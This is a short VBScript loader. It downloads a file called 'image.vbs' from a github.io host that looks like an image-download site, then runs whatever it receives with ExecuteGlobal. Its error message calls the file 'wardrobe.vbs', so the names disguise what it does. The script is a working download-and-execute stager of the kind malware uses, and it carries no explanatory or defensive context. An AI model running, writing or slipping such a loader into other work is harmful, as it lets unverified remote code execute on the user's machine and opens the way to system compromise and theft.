Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://downloads-img.github.io/AGTA/image.vbs", False
http.Send
If http.Status = 200 Then
    ExecuteGlobal http.responseText
Else
    MsgBox "Failed to download wardrobe.vbs. HTTP " & http.Status, vbCritical
End If